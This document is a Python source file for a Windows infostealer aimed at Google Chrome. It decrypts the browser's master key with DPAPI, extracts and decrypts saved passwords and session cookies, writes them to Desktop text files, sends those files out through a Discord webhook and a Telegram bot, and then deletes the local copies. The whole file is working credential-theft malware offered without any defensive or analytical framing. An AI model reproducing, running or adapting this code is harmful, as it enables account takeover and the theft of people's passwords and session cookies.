import os
import json
import base64
import shutil
import sqlite3
import requests
import win32crypt
from Crypto.Cipher import AES
from pathlib import Path
from dotenv import load_dotenv

# Load environment variables
dotenv_path = Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

windows_enviroment = {
    'app_local': 'LOCALAPPDATA',
    'app_roaming': 'APPDATA',
    'computer_name': 'COMPUTERNAME',
    'user_path': 'HOMEPATH',
    'username': 'USERNAME'
}

userprofile_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
password_file_path = userprofile_path + r'\passwords.txt'
cookies_file_path = userprofile_path + r'\cookies.txt'

# Functions
def get_encryption_keys():
    chrome_local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(chrome_local_state, "r", encoding="utf-8") as read_the_state:
        state_lines = read_the_state.read()
        json_state_lines = json.loads(state_lines)
    encryption_keys = base64.b64decode(json_state_lines["os_crypt"]["encrypted_key"])
    encryption_key = encryption_keys[5:]
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decrypt_chrome_data(data, encryption_key):
    try:
        initialization_vector = data[3:15]
        data = data[15:]
        cipher_key = AES.new(encryption_key, AES.MODE_GCM, initialization_vector)
        return cipher_key.decrypt(data)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except: return ""

def extract_chrome_password():
    chrome_login_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    password_database = "ChromeData.db"
    shutil.copyfile(chrome_login_data, password_database)
    connect_chrome_database = sqlite3.connect(password_database)
    connection_cursor = connect_chrome_database.cursor()
    connection_cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    encryption_key = get_encryption_keys()
    with open(password_file_path, 'w+', encoding="utf-8") as password_file:
        for all_passwords in connection_cursor.fetchall():
            app_url = all_passwords[0]
            relative_url = all_passwords[1]
            app_username = all_passwords[2]
            app_password = decrypt_chrome_data(all_passwords[3], encryption_key)
            if app_username or app_password:
                password_file.write(f'URL: {app_url, relative_url}\n Username: {app_username}\n Password: {app_password}\n\n')
    connect_chrome_database.close()
    print(f"Password file created at: {password_file_path}")

def extract_chrome_cookie():
    chrome_cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    cookies_database = "Cookies.db"
    shutil.copyfile(chrome_cookies_path, cookies_database)
    connect_chrome_database = sqlite3.connect(cookies_database)
    connection_cursor = connect_chrome_database.cursor()
    connection_cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
    encryption_key = get_encryption_keys()
    with open(cookies_file_path, 'w+', encoding="utf-8") as cookies_file:
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in connection_cursor.fetchall():
            if not value: decrypted_cookies = decrypt_chrome_data(encrypted_value, encryption_key)
            else: decrypted_cookies = value
            cookies_file.write(f"Host: {host_key}\n Cookie Name: {name}\n Cookie Value : {decrypted_cookies}\n\n")
    connect_chrome_database.close()
    print(f"Cookies file created at: {cookies_file_path}")

def send_file_to_discord(file_path, file_description):
    with open(file_path, 'rb') as file:
        files = {
            'file': (os.path.basename(file_path), file)
        }
        payload = {
            'content': file_description,
            'username': 'File Sender'
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        if response.status_code == 204:
            print(f"File {file_path} successfully sent to Discord")
        else:
            print(f"Failed to send file {file_path} to Discord: {response.status_code}")

def send_file_to_telegram(file_path, file_description):
    with open(file_path, 'rb') as file:
        response = requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
            data={'chat_id': TELEGRAM_CHAT_ID, 'caption': file_description},
            files={'document': file}
        )
        if response.status_code == 200:
            print(f"File {file_path} successfully sent to Telegram")
        else:
            print(f"Failed to send file {file_path} to Telegram: {response.status_code}")

def delete_files():
    try:
        if os.path.exists(password_file_path):
            os.remove(password_file_path)
            print(f"Deleted file: {password_file_path}")
        if os.path.exists(cookies_file_path):
            os.remove(cookies_file_path)
            print(f"Deleted file: {cookies_file_path}")
    except Exception as e:
        print(f"Error deleting files: {e}")
